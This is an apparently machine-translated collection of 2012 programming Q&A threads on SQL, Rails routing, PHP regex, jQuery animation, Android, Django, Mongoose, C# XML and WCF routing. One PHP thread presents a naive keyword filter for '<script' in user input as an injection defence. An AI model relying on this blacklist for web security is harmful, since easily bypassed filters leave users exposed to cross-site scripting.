> 时间：2012-05-15T04:26:31.007

经过长时间的研究，这个查询对我有用......

我得出的经验结果：

1）您还需要在子查询中定义 where 条件。2）如果在关系运算符中比较的 ids (t2._id <= t1._id) 将是主键，那么它在所有情况下都可以正常工作。
3）关于 orderby 条件，您必须根据您的选择或需要来决定。

```
SELECT 
(SELECT COUNT(*) FROM table t2 WHERE t2._id <= t1._id AND t2.Recipe_id = 2) AS RowNumber,_id,Recipe_id,col2,col3,col4
FROM table t1
WHERE Recipe_id = 2
ORDER BY _id 
```

这个怎么运作：-

假设我们在某个表 t 中有一系列主键 1,2,3,4,5,6

现在我们使用表 t1 和表 t2 创建它的两个别名

```
Now both have same sequence table t1 -> 11,12,13,14,15,16
                            table t2 -> 11,12,13,14,15,16 
```

现在这个条件`( WHERE t2._id <= t1._id )`将 t2 的第一个主键“11”与 t2 的第一个主键“11”进行比较`as 11=11`，它将`return count()`只存在一行，因此我们`get "1" in row number`..

```
*** remember for every row in Outer query the sub-query is executed *** 
```

因此`now outer query is at row second having primary key "12"`

现在它会这`again compare the ( WHERE t2._id <= t1._id )` 一次..`again t2._id contains "11"``t1._id contains "12"`

安静清楚，它将返回`TWO rows are there`具有`ids <= 12` 11 和 12 的内容

这样它将生成所需的序列......

这是生成序列的一个简单技巧..实际上看起来并不简单，但当你深入了解它时真的很简单..

我不是专家，但这是我所理解的..希望解释有所帮助......

由于网上有各种解决方案或相同的解决方案，但没有解释..

:)

# php - 在mysql中选择具有多个条件的上一条记录

> ID：10148288
> 
> 赞同：0
> 
> 时间：2012-04-13T21:04:10.917
> 
> 标签：php, mysql

这个问题很难量化，所以我第一次可能没有正确措辞这个问题。

我有一个类似于以下格式的表格：

```
| id | other_id | timestamp  |
|  1 |        1 | 2012-01-01 |
|  2 |        1 | 2012-01-02 |
|  3 |        2 | 2012-01-02 | 
```

我正在尝试做的是，给定“id”为 2 的记录和类似的记录，其中“id”列值是已知的并且是唯一的，并且“other_id”已知与之对应，我该如何找到，对于每一个，记录的“id”具有相同的“other_id”，但第一个低于我已知的“id”。

例如

```
$arrKnownIds = array (
 0 => array('id'=>2,'other_id'=>1),
 1 => array('id'=>3,'other_id'=>2)
); 
```

有了这些信息，我想运行一个查询，结果如下：

```
while($row = mysql_fetch_assoc($result)) {
 $arrPreviousIds[$row['other_id']] = $row['id'];
 // having in this case values of:
 // $row['other_id'] = 2;
 // $row['id'] = 1;
} 
```

如果我需要使用 UNION、多个 php 查询语句或是否有其他方法来解决这个问题，我无法完全确定。

任何关于如何解决这个问题的想法都非常感谢。

谢谢 ：）

**编辑**- 原始查询采用以下形式：

```
SELECT DISTINCT(`other_id`), MAX(`id`), MAX(`timestamp`)
FROM `event`
GROUP BY `other_id`
ORDER BY `id` DESC, `other_id` ASC
LIMIT 0, 10 
```

// 这旨在获取最后 10 个唯一事件并查找它们发生的时间。

// 由此，我然后尝试查找它们之前发生的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:22:46.293

这个怎么样？

```
SELECT t1.id, (SELECT id
               FROM tbl t2
               WHERE t2.other_id = t1.other_id
               AND t2.id < t1.id
               ORDER BY t2.id DESC
               LIMIT 1)
FROM tbl t1
WHERE t1.id IN (1,2,3) 
```

如果您要处理大型结果集，有更有效的方法可以做到这一点。你能解释一下你将如何使用这个查询吗？

**更新**- 基于将现有查询添加到此处的问题是一个更新的查询，将两者结合起来 -

```
SELECT tmp.*, (SELECT `timestamp`
               FROM `event`
               WHERE `event`.`other_id` = `tmp`.`other_id`
               AND `event`.`id` < `tmp`.`id`
               ORDER BY `event`.`id` DESC
               LIMIT 1) AS `prev_timestamp`
FROM (
    SELECT `other_id`, MAX(`id`) AS `id`, MAX(`timestamp`) AS `timestamp`
    FROM `event`
    GROUP BY `other_id`
    ORDER BY `id` DESC, `other_id` ASC
    LIMIT 0, 10
) tmp 
```

我没有尝试过，但它应该会给出预期的结果。

# ruby-on-rails-3 - 如何为 has_many 创建对称、DRY、RESTful 接口：通过关系？

> ID：10148294
> 
> 赞同：1
> 
> 时间：2012-04-13T21:04:24.937
> 
> 标签：ruby-on-rails-3, rest, routing, has-many-through

假设一个标准的 has_many :through 三个模型之间的关系

```
class Person < ActiveRecord::Base
  has_many :memberships, :dependent => :destroy
  has_many :clubs, :through => :memberships
end
class Club < ActiveRecord::Base
  has_many :memberships, :dependent => :destroy
  has_many :persons, :through => :memberships
end
class Membership < ActiveRecord::Base
  belongs_to :person
  belongs_to :club
end 
```

在 API 驱动的应用程序中，您希望公开 URI：

*   列出人 x 所属的俱乐部
*   列出属于俱乐部 y 的成员
*   （......以及通常的 CRUD 方法集合......）

我的第一个想法是实现一对映射到 MembersController 的嵌套路由，例如：

```
GET /clubs/:club_id/memberships     => members_controller#index
GET /persons/:person_id/memberships => members_controller#index 
```

...但是这里有点奇怪。

两条路由都映射到相同的 members_controller 方法（索引）。没问题——我可以查看`params`哈希以查看是否给出了 :club_id 或 :person_id ，并在 members_controller 表上应用适当的范围。

但我不确定我们是否要向最终用户公开 Member 对象。一对更直观的路线（至少从用户的角度来看）可能是：

```
GET /clubs/:club_id/persons   
GET /persons/:person_id/clubs 
```

...这将返回一个人员列表和一个俱乐部列表（分别）。

但是，如果您这样做，您会将这些路由映射到哪个控制器和操作？Rails 中是否有任何提供指导的约定？或者这是否偏离轨道足够远，我应该以任何我认为合适的方式实施它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T06:56:39.613

我最终实现了完成以下任务的路由和控制器：

*   它是完全 RESTful 的。
*   它是完全对称的： /persons/:person_id/clubs/:club_id/memberships 与 /clubs/:club_id/persons/:person_id/memberships 相同
*   它非常干燥。
*   普通用户永远不会看到会员身份：id。相反， :person_id 和 :club_id 用作引用特定成员资格的复合键。
*   它确实允许通过 :id 直接访问 Membership 对象，但这是为管理员保留的。

以下是它识别的一些路线：

```
/persons/:person_id/clubs/:club_id/memberships - a specific membership association
/clubs/:club_id/persons/:person_id/memberships - equivalent
/persons/:person_id/clubs - all the clubs that a specific person belongs to
/clubs/:club_id/persons - all the persons that belong to a specific club
/memberships/:id - access to a specific membership (accessible only to admin) 
```

请注意，在以下示例中，我没有包含用于身份验证和授权的 Devise 和 CanCan 构造。它们很容易添加。

这是路由文件：

```
# file: /config/routes.rb
Clubbing::Application.routes.draw do

  resources :persons, :except => [:new, :edit] do
    resources :clubs, :only => :index
  end

  resources :clubs, :except => [:new, :edit] do
    resources :persons, :only => :index
  end

  resources :memberships, :except => [:new, :edit]

  # there may be clever ways to specify these routes using #resources and
  # #collections and #member, but this ultimately is more straightforward

  match "/persons/:person_id/clubs/:club_id/memberships" => "memberships#create", :via => :post
  match "/persons/:person_id/clubs/:club_id/memberships" => "memberships#show", :via => :get
  match "/persons/:person_id/clubs/:club_id/memberships" => "memberships#update", :via => :put
  match "/persons/:person_id/clubs/:club_id/memberships" => "memberships#destroy", :via => :delete

  match "/clubs/:club_id/persons/:person_id/memberships" => "memberships#create", :via => :post
  match "/clubs/:club_id/persons/:person_id/memberships" => "memberships#show", :via => :get
  match "/clubs/:club_id/persons/:person_id/memberships" => "memberships#update", :via => :put
  match "/clubs/:club_id/persons/:person_id/memberships" => "memberships#destroy", :via => :delete 
```

控制器出奇地简单。对于 PersonsController 和 ClubsController，唯一不标准的事情是在 :index 方法中，我们在参数和范围中相应地查找 :club_id 或 :person_id 的存在：

```
# file: /app/controllers/persons_controller.rb
class PersonsController < ApplicationController
  respond_to :json
  before_filter :locate_collection, :only => :index
  before_filter :locate_resource, :except => [:index, :create]

  def index
    respond_with @persons
  end

  def create
    @person = Person.create(params[:person])
    respond_with @person
  end

  def show
    respond_with @person
  end

  def update
    if @person.update_attributes(params[:person])
    end
    respond_with @person
  end

  def destroy
    @person.destroy
    respond_with @person
  end

  private

  def locate_collection
    if (params.has_key?("club_id"))
      @persons = Club.find(params[:club_id]).persons
    else
      @persons = Person.all
    end
  end

  def locate_resource
    @person = Person.find(params[:id])
  end

end

# file: /app/controllers/clubs_controller.rb
class ClubsController < ApplicationController
  respond_to :json
  before_filter :locate_collection, :only => :index
  before_filter :locate_resource, :except => [:index, :create]

  def index
    respond_with @clubs
  end

  def create
    @club = Club.create(params[:club])
    respond_with @club
  end

  def show
    respond_with @club
  end

  def update
    if @club.update_attributes(params[:club])
    end
    respond_with @club
  end

  def destroy
    @club.destroy
    respond_with @club
  end

  private

  def locate_collection
    if (params.has_key?("person_id"))
      @clubs = Person.find(params[:person_id]).clubs
    else
      @clubs = Club.all
    end
  end

  def locate_resource
    @club = Club.find(params[:id])
  end

end 
```

MembershipsController 只是稍微复杂一点：它在参数哈希中检测 :person_id 和/或 :club_id 并相应地应用范围。如果 :person_id 和 :club_id 都存在，我们可以假设它指的是一个唯一的会员对象：

```
# file: /app/controllers/memberships_controller.rb
class MembershipsController < ApplicationController
  respond_to :json
  before_filter :scope_collection, :only => [:index]
  before_filter :scope_resource, :except => [:index, :create]

  def index
    respond_with @memberships
  end

  def create
    @membership = scope_collection.create(params[:membership])
    respond_with @membership
  end

  def show
    respond_with @membership
  end

  def update
    if @membership.update_attributes(params[:membership])
    end
    respond_with @membership
  end

  def destroy
    @membership.destroy
    respond_with @membership
  end

  private

  # apply :person_id and/or :club_id scoping if present in params hash

  def scope_collection
    @memberships = scope_by_parameters
  end

  def scope_resource
    @membership = scope_by_parameters.first
  end

  def scope_by_parameters
    scope_by_param_id(scope_by_param_id(Membership.scoped, :person_id), :club_id)
  end

  def scope_by_param_id(relation, scope_name)
    (id = params[scope_name]) ? relation.where(scope_name => id) : relation
  end

end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-14T17:03:00.040

## 附录

（不是答案——只是观察）。这个问题的大部分可以重新定义为“REST 如何处理复合键？”

当您使用单个 ID 来定位资源（例如 /customers/2141）时，REST 理念很明确。当资源由复合键唯一定义时，我们不太清楚该怎么做：在上面的示例中，/clubs/:club_id 和 /persons/:person_id 形成唯一标识成员资格的复合键。

我还没有读过[罗伊菲尔丁](http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm)对此事的看法。所以这是下一步。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T17:35:41.503

不管你如何在 Rails 中做到这一点，以 RESTful 方式做到这一点的关键是你可以拥有超链接。从一个人的角度来看，什么是会员列表，而不是指向他们所属俱乐部的链接列表？（好吧，每个都有一些额外的数据。）除了指向会员的链接列表之外，俱乐部的会员列表是什么（再次，可能带有一些额外的数据）？

鉴于此，从一个人的角度来看，会员资格实际上是 Membership 表上的一个视图（从俱乐部的角度来看也是如此；*在这个抽象级别*上没有区别）。棘手的一点是，当您更改一个人的成员资格时，您必须通过视图将更改推送回基础表。那仍然是 RESTful 的；拥有 RESTful 资源并不意味着在没有直接指示更改时资源永远不会更改。（这将禁止各种有用的东西，例如共享资源！）事实上，REST 在这方面的真正含义是客户端不应该假设它可以安全地缓存所有内容，除非托管服务明确表示它可以（通过合适的元数据/HTTP 标头）。

# php - PHP - preg_match - 如何将字符串大小写与之前或之后的任何内容进行匹配？

> ID：10148297
> 
> 赞同：3
> 
> 时间：2012-04-13T21:04:35.800
> 
> 标签：php, preg-match, variations

我有一个函数的一部分是这样的：

```
if (preg_match("#\bscript\b#",$userInput))
{
    $bannedWord = 'script';
    logHax();
    return TRUE;
} 
```

这对我要完成的工作造成了问题，因为它只会匹配确切的单词“脚本”而不是它的变体，例如“ScriPt”或“ `<script>`”。

我想要的是不匹配字符串的示例以及原始字符串返回 true。

有人可以让我对此事有所了解。

此外，任何涵盖此类内容的教程将不胜感激，

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-13T21:21:22.267

这个怎么样：

```
if (preg_match("/<script\b[^>]*>/i",$userInput))
{
    $bannedWord = 'script';
    logHax();
    return TRUE;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T21:08:07.207

不区分大小写的匹配：

```
preg_match("#\bscript\b#i",$userInput) 
```

注意`i`. 另请注意，这[是文档](http://php.net/manual/en/function.preg-match.php)中***的第一个示例***：

```
<?php
// The "i" after the pattern delimiter indicates a case-insensitive search
if (preg_match("/php/i", "PHP is the web scripting language of choice.")) {
    echo "A match was found.";
} else {
    echo "A match was not found.";
}
?> 
```

干杯

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-13T21:13:43.440

如果你真的想在字符串之前或之后匹配“任何东西”（不仅仅是一个词），那么你甚至不需要 preg_match 在这里，因为你可以这样做：

```
$userInputLower = strtolower($userInput);
if (strpos($userInputLower, 'script') !== false)
{
    $bannedWord = 'script';
    logHax();
    return TRUE;
} 
```

# javascript - “一团烟雾”效果 javascript sprite 动画

> ID：10148298
> 
> 赞同：2
> 
> 时间：2012-04-13T21:04:38.830
> 
> 标签：javascript, animation, settimeout, jquery-animate

此代码和动画在 jQuery 1.4.4 及更低版本上完美运行，但不适用于更高版本。任何人都可以对这个问题有所了解，并帮助提供适用于最新 jQuery 的版本。我在下面提供了一个小提琴。

[http://jsfiddle.net/Y7Ek4/10/](http://jsfiddle.net/Y7Ek4/10/)

poof 效果基本上依赖于调整背景位置来创建 css sprite 动画，但它在新的 jQuery 上很糟糕。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-13T23:04:14.200

jQuery 的动画不再适用于精灵动画。我不得不自己使用`setTimeout`. 该效果的灵感来自用于从 OS X 扩展坞中删除项目的效果。

精灵：

[![噗的效果精灵](../Images/1bf0d4a994caadf96309f8604b0b6399.png)](https://i.stack.imgur.com/Gw6wm.png)

相关JS代码：

```
function animatePoof() {
    var bgTop = 0,
        frame = 0,
        frames = 6,
        frameSize = 32,
        frameRate = 80,
        puff = $('#puff');
    var animate = function(){
        if(frame < frames){
            puff.css({
                backgroundPosition: "0 "+bgTop+"px"
            });
            bgTop = bgTop - frameSize;
            frame++;
            setTimeout(animate, frameRate);
        }
    };

    animate();
    setTimeout("$('#puff').hide()", frames * frameRate);
} 
```

完整的工作示例，包括 HTML 和 CSS：http: [//jsfiddle.net/Y7Ek4/22/](http://jsfiddle.net/Y7Ek4/22/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-21T16:44:38.937

你也可以使用这个（我的）库：[Audero Smoke Effect](https://github.com/AurelioDeRosa/Audero-Smoke-Effect)。它适用于最新版本的 jQuery。

# android - 如何让一个类扩展到 Android 中的常规活动和列表活动

> ID：10148299
> 
> 赞同：0
> 
> 时间：2012-04-13T21:04:49.000
> 
> 标签：android, inheritance, android-activity, listactivity

在我的应用程序中，我有一些我希望列表和常规活动都可以使用的常用方法和属性。我想使用继承来创建一个父类来扩展这两种类型的活动。如果我让父类扩展列表活动，那么常规活动会给我一个例外：

java.lang.RuntimeException：您的内容必须有一个 id 属性为 'android.R.id.list' 的 ListView

反之亦然，我将没有我需要扩展此父类的类的列表功能。

如何在不将相同方法复制到扩展 listactivity 和 activity 的两个不同类的情况下完成此操作？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:15:41.657

您不必拥有 ListActivity 才能将 ListView 作为布局内的视图。

基于此，您可以创建一个扩展 Activity 的 BaseActivity，并在其中添加所有方法和属性。

然后你所有的活动都可以扩展这个 BaseActivity。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:15:51.523

除非您正在寻找使用 ListView 的最简单方法，否则无需使用 ListActivity。

我解决这个问题的方法是列出我需要的活动，以及我需要的所有功能，只有一些，并`extend`相应地。

例如，您可以让您的超级基础活动，`BaseActivity`. 这可以具有所有子活动所需的设置、拆卸和任何其他功能。从那里，您可以拥有类似的东西`BaseListActivity`extends `BaseActivity`，处理您可能需要的一切，`BaseActivity`并为 ListViews 添加功能。

```
Activity > BaseActivity > BaseListActivity > MyListActivity
Activity > BaseActivity > MyPlainActivity 
```

这是我一直致力于管理游标和 ListViews 的一些课程的视频。

[ManagedActivity 课程 - YouTube](http://www.youtube.com/watch?v=J2Mxt_YuSjc&list=UUH4V9MOQFCb13u9MrYN5X0Q&index=1&feature=plcp)

# django - 为什么 pgettext_lazy 会破坏我的模板，但 ugettext_lazy 不会？

> ID：10148303
> 
> 赞同：4
> 
> 时间：2012-04-13T21:04:57.307
> 
> 标签：django, internationalization, translation, lazy-evaluation

当我在模型的 help_text 上使用 pgettext_lazy 时，我的模板失败了。它适用于 ugettext_lazy。

错误

```
Caught TypeError while rendering: Lazy object returned unexpected type. 
```

模型

```
class BalanceIncreaseOrder(models.Model):
    amount = models.FloatField(help_text=pgettext_lazy("Translators: please localize this to reflect the correct currency", "Note: amount will be billed in United States dollars (USD)")) 
```

形式

```
class BalanceIncreaseOrderForm(ModelFormRequired):
    class Meta:
        model = BalanceIncreaseOrder
        fields = ("amount",) 
```

模板

```
{% for field in form %}
    {{ field }}
{% endfor %} 
```

在每种方式设置帮助文本之后，我已经调试了模型。两次都打印出来

```
<django.utils.functional.__proxy__ object at 0x10fcb3a50> 
```

pgettext_lazy 中是否有错误？有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T09:50:44.220

我有同样的问题。我用了

```
unicode(pgettext_lazy('context', 'string')) 
```

这将消除错误，但现在`manage.py makemessages`不会选择已翻译的行。

也许这会对你有所帮助..

编辑：

啊，我找到了解决方案：

```
pgettext_lazy(u'context', u'string') 
```

这将完成这项工作。

# mongodb - DbRef 与 Mongoose - mongoose-dbref 还是填充？

> ID：10148308
> 
> 赞同：4
> 
> 时间：2012-04-13T21:05:13.460
> 
> 标签：mongodb, mongoose

我有以下两种模式：

公司活动：

```
var companyEventSchema = new Schema({
    name : String,
    description
    date : Date,
    attendees : [ { type : Schema.ObjectId, ref : 'Member' } ],
]}); 
```

和会员

```
var memberSchema = new Schema({
    name : String,
    emailAddress: String,
    password :String,
    created: { type: Date, default: Date.now }
}); 
```

我从 companyEventSchema 中引用 Member 的方式是否正确？我正在尝试做一些很长的 dbref 行。

不过，我看到了一个单独的项目...... [mongoose-dbref](https://github.com/goulash1971/mongoose-dbref)

但是，猫鼬文档说上面提供了“类似 dbref 的功能”

哪个效率更高？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-25T14:37:18.670

您只需要在字段可以包含引用可能多个集合中的文档的 ObjectId 的情况下使用实际[`DBRef`](http://docs.mongodb.org/manual/applications/database-references/#dbrefs)(and )。`mongoose-dbref`A`DBRef`是一个 元组`ObjectId`，一个集合名称和一个可选的数据库名称。

`ref:`然而，Mongoose字段只包含一个`ObjectId`，它是 Mongoose 模式，它定义了 ObjectIds 引用的集合**。**

因此，Mongoose`ref:`字段更有效，除非您需要提供的多集合引用支持，否则应始终使用`DBRef`。

# c# - 将xml存储在对象中

> ID：10148312
> 
> 赞同：0
> 
> 时间：2012-04-13T21:05:45.570
> 
> 标签：c#, xml, xml-parsing

说，我有这样的xml文件：

```
<?xml version="1.0"?>
<catalog>
   <title>My book catalog</title>
   <link>http://example.com/catalog</link>
   <book id="bk101">
      <author>Gambardella, Matthew</author>
      <title>XML Developer's Guide</title>
      <genre>Computer</genre>
      <price>44.95</price>
      <publish_date>2000-10-01</publish_date>
      <description>An in-depth look at creating applications 
      with XML.</description>
   </book>
   <book id="bk102">
      <author>Ralls, Kim</author>
      <title>Midnight Rain</title>
      <genre>Fantasy</genre>
      <price>5.95</price>
      <publish_date>2000-12-16</publish_date>
      <description>A former architect battles corporate zombies, 
      an evil sorceress, and her own childhood to become queen 
      of the world.</description>
   </book>
</catalog> 
```

最后需要获取对象，我可以使用如下：

```
xml.title    //must return "My book catalog"
xml.link     //must return "http://example.com/catalog"
xml.book[0]  //is an object with following properties:
             //author, title, genre etc...
             //i.e., xml.book[0].author must return Gambardella, Matthew 
```

希望没有类似的问题，如果有的话，我很抱歉，我没有找到。另外，如果有任何关于此的文档，特殊情况，请指出它，因为我找不到它。有很多关于以各种方式解析 xml 的文档，但没有关于这种情况的信息。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-15T00:30:35.800

[这是使用这些扩展方法](https://github.com/ChuckSavage/XmlLib/blob/master/XElementExtensions.cs)的工作 LinqToXml 代码：

```
[DebuggerDisplay("{Title}")]
public class Catalog
{
    XElement self;
    public Catalog(XElement catalog) { self = catalog; }
    public string Title { get { return self.Get("title", string.Empty); } }
    public Uri Link { get { return self.Get<Uri>("link", null); } }
    public Book[] Books
    {
        get { return _Books ?? (_Books = self.GetEnumerable("book", x => new Book(x)).ToArray()); }
    }
    Book[] _Books;
    [DebuggerDisplay("{Title} by {Author}")]
    public class Book
    {
        XElement self;
        public Book(XElement book) { self = book; }
        public string Id { get { return self.Get("id", string.Empty); } }
        public string Author { get { return self.Get("author", string.Empty); } }
        public string Title { get { return self.Get("title", string.Empty); } }
        public string Genre { get { return self.Get("genre", string.Empty); } }
        public decimal Price { get { return self.Get<decimal>("price", 0); } }
        public DateTime PublishDate { get { return self.Get("publish_date", DateTime.MinValue); } }
        public string Description { get { return self.Get("description", string.Empty); } }
    }
} 
```

并使用它：

```
Catalog catalog = new Catalog(XElement.Load(file)); // or .Parse(string) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T12:54:52.383

```
doc = XDocument.Load("path/to/file.xml");
List<book> items = doc.Root.Element("catalog").Elements("book").
        Select(e => new book(
            (string)e.Element("author").Value,
            (string)e.Element("title").Value,
            (string)e.Element("price").Value,
            (string)e.Element("publish_date").Value,
            (string)e.Element("description").Value,
            (string)e.Element("genre").Value
        )).ToList(); 
```

# wcf - WCF 4 路由多播配置挫折

> ID：10148314
> 
> 赞同：0
> 
> 时间：2012-04-13T21:05:55.457
> 
> 标签：wcf, c#-4.0, routing, multicast

多年来，我一直使用 stackoverflow.com 作为专业程序员的资源。当我在谷歌上搜索某些东西时，我会说十分之八，我会在这里找到一个问题和答案，当这种情况发生时我总是会松一口气，因为我知道我即将找到我需要的信息。

我一直在努力解决（我认为是）一个简单的问题，涉及使用 WCF 技术设置路由服务。我在这里浏览了具有类似标题的问题，并且查阅了很多资源（关于该主题的实际书籍以及网站）试图弄清楚这一点，但无济于事。

简而言之，我想设置一个具有以下布局的系统：

```
{client}<-basicHTTP->{portal/router}<-fullWCF-WS*->{end-point-services1..n} 
```

*客户端*：获取对门户的服务引用，**能够调用端点服务**
*门户/路由器*的功能：从客户端获取请求，并将它们发送到多播设置中
*的端点服务 end-point-services1..n*：从客户端获取请求，通过门户路由，处理请求以搜索事物，然后响应或将数据记录到数据库中以供稍后检查

我 100% 能够启动并运行路由服务。我能够遵循的最成功的模型在“WCF4 中的新增功能：练习 8 和 9，内容桥接和路由”(msdn.microsoft.com/en-us/gg465212) 和“Hello World with the路由服务”（msdn.microsoft.com/en-us/library/dd795218.aspx）但我使用了我咨询过的所有来源（如下所列）中的点点滴滴。

基本上，让我感到沮丧的是，我希望客户端（第 3 方）能够将 Web 服务引用添加到门户服务（或者，最坏的情况下，使用 svcutil.exe 方法），然后**完成**通过他们的设置。通过该引用，他们将引用他们想要在所有场景中调用的所有函数/方法。我看过的模型需要 2 个引用，一个指向实际服务，一个指向路由器，然后强制客户端在其设置中专门调用路由器。我使这个特定设置工作的其他尝试都没有奏效。

您对此的帮助将**不胜**感激。

* * *

这是我的工作模型的简化版本，***几乎***可以满足我的要求：

* * *

（注意，所有服务都托管在 IIS 中）

**门户服务（和 IIS 主机）**

Portal.svc：
`<%@ ServiceHost Service="System.ServiceModel.Routing.RoutingService, System.ServiceModel.Routing, version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>`
Web.config：

```
<configuration>
  <system.serviceModel>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
    <bindings>
      ...  
    </bindings>
    <client>
      <endpoint address="http://searcher1/Searcher.svc/general" binding="basicHttpBinding" contract="*" name="regularSearchServiceEndpoint" />
      <endpoint address="http://searcher2/Searcher.svc/general" binding="basicHttpBinding" contract="*" name="regularSearchServiceEndpoint2" />
    </client>
    <behaviors>
      ...
    </behaviors>
    <routing>
      <filters>
        <filter name="MatchAllFilter" filterType="MatchAll" />
      </filters>
      <filterTables>
        <filterTable name="filterTable1">
          <add filterName="MatchAllFilter" endpointName="regularSearchServiceEndpoint" backupList="backupList1" priority="0"/>
        </filterTable>
      </filterTables>
      <backupLists>
        <backupList name="backupList1">
          <add endpointName="regularSearchServiceEndpoint2"/>
        </backupList>
      </backupLists>
    </routing>
    <services>
      <service behaviorConfiguration="routingConfiguration" name="System.ServiceModel.Routing.RoutingService">
        <endpoint address="general" binding="basicHttpBinding" name="routerEndpoint1" contract="System.ServiceModel.Routing.IRequestReplyRouter" />
      </service>
    </services>
  </system.serviceModel>
</configuration> 
```

* * *

**搜索服务**

ISearch.cs：

```
namespace SearchService
{
  [ServiceContract]
  public interface ISearch
  {
    [OperationContract]
    string Ping();
    [OperationContract]
    string searchByInput(string input);
  }
} 
```

应用程序配置：

```
<configuration>
  <!-- When deploying the service library project, the content of the config file must be added to the host's 
  app.config file. System.Configuration does not support config files for libraries. -->
  <system.serviceModel>
    <bindings>
      <basicHttpBinding>
        ...
      </basicHttpBinding>
      <customBinding>
        ...
      </customBinding>
    </bindings>
    <client>
      ...
    </client>
    <services>
      <service name="SearchService.Search">
        <endpoint address="general" binding="basicHttpBinding" contract="SearchService.ISearch" name="SearchService">
          <identity>
            <dns value="localhost" />
          </identity>
        </endpoint>
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange"/>
        <host>
          <baseAddresses>
            <add baseAddress="http://localhost:8732/Design_Time_Addresses/SearchService/Service1/"/>
          </baseAddresses>
        </host>
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <serviceMetadata httpGetEnabled="True"/>
          <serviceDebug includeExceptionDetailInFaults="False"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel>
</configuration> 
```

* * *

**搜索服务主机**

搜索.svc：
`<%@ ServiceHost Service="SearchService.Search" %>`
Web.config：

```
<configuration>
  <system.serviceModel>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
    <bindings>
      <basicHttpBinding>
        <!--copied over from SearchService.App.config-->
      </basicHttpBinding>
      <customBinding>
        <!--copied over from SearchService.App.config-->
      </customBinding>
    </bindings>
    <client>
      <!--copied over from SearchService.App.config-->
    </client>
    <services>
      ...
    </services>
    <behaviors>
      ...
    </behaviors>
  </system.serviceModel>
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer>
</configuration> 
```

* * *

**客户（一切都出错了）**

我能够让它做我想做的唯一方法是向搜索器服务添加一个 Web 服务引用（名为“remotehost”），然后手动将客户端端点添加到路由器的 app.config 文件中，然后强制客户端代码使用它，而不是它已经拥有的直接链接到搜索者

主要.cs：

```
namespace Client  
{  
  public partial class Main : Form  
  {  
    remotehost.SearchClient proxy;  
    public Main()  
    {  
      InitializeComponent();  
      proxy = new remotehost.SearchClient("RouterService");//("BasicHttpBinding_ISearch")  
    }  
    private void button1_Click(object sender,EventArgs e)  
    {  
      string response = string.Empty;
      //uses method exposed by the SearchService service
      response = proxy.Ping();
      MessageBox.Show("Response from remote service:\n" + response
        "Ping Response",
        MessageBoxButtons.OK,
        MessageBoxIcon.Information);
    }
  }
} 
```

应用程序配置：

```
<configuration>
  <system.serviceModel>
    <bindings>
      <basicHttpBinding>
        ...
      </basicHttpBinding>
    </bindings>
    <client>
      <endpoint address="http://searcher1/Searcher.svc/general" binding="basicHttpBinding" bindingConfiguration="SearchService" contract="remotehost.ISearch" name="SearchService" />
      <!--I manually added this-->
      <endpoint address="http://portal/Portal.svc/general" binding="basicHttpBinding" contract="remotehost.ISearch" name="RouterService" />
    </client>
  </system.serviceModel>
</configuration> 
```

* * *

我想强调，这一切都有效，但它并没有按照我想要的方式工作。我相当确定我可以将它推/拉/哄到我设想的优雅设置中，但我似乎无法找到第一次引导我完成它的资源或指南。

帮助？

* * *

## 我来这里之前咨询过的消息来源：

```
Learning WCF: A Hands-on Guide, by Bustamante, Michele Leroux {978-0-5961-0162-6} (read cover to cover, and did all exercises)  
Windows Communication Foundation 4: Step By Step {978-0-7356-4556-1} (focused on chapter 14: Discovering Services and Routing Messages)  
msdn.microsoft.com/en-us/library/ms734712.aspx {WCF: Getting Started Tutorial}  
msdn.microsoft.com/en-us/gg465212 {what's new in WCF4: exercises 8 & 9, content bridging & routing}  
codeproject.com/Articles/146835/How-to-create-scalable-services-with-WCF-4-0-Route {How to create scalable services with WCF 4.0 Router and Discovery services}  
msdn.microsoft.com/en-us/library/dd795218.aspx {Hello World with the Routing Service}  
msdn.microsoft.com/en-us/library/ee517421.aspx {routing}  
  msdn.microsoft.com/en-us/library/ee517423.aspx {routing service overview}  
  msdn.microsoft.com/en-us/library/ee517418.aspx {routine service features}  
  msdn.microsoft.com/en-us/library/ee517422.aspx {routing intro}  
  msdn.microsoft.com/en-us/library/ee517420.aspx {routing contracts}  
msdn.microsoft.com/en-us/library/bb332338.aspx {wcf routing}  
msdn.microsoft.com/en-us/library/ms730158.aspx {more wcf routing}  
msdn.microsoft.com/en-us/library/ee354381.aspx {more wcf routing}  
dandcohen.wordpress.com/2010/03/02/wcf-4-routing-service-multicast-sample/ {WCF 4 Routing Service Multicast sample} 
```

* * *

更新：2012-04-28：

我想出了一种方法来做我想做的事。它仍然没有我想要的那么优雅，但它完成了工作并让我继续前进。

基本上，从主服务中获取接口，并在一个新服务中实现它，称之为路由器或门户，或其他任何东西。在新的路由器/门户服务中，添加对主服务的新服务引用。

现在，两个服务都使用相同的接口，并且它们的所有方法都具有相同的签名，因此您可以将门户/路由器服务 wsdl 提供给第三方客户端，并且只允许您的门户/路由器服务与主要服务。

